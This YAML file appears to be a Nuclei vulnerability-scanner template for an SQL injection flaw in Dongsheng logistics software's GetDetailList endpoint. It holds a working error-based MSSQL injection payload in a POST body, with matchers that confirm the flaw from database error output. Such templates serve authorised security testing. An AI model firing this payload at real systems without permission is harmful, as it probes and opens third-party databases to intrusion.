id: poc-yaml-dongshengsoft-getdetaillist-sqli
info:
  name: 东胜物流软件 GetDetailList SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - method: POST
    path:
      - /MvcShipping/MsChDui/GetDetailList
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: condition=1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "SqlException:"
          - "MsChDuiController"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
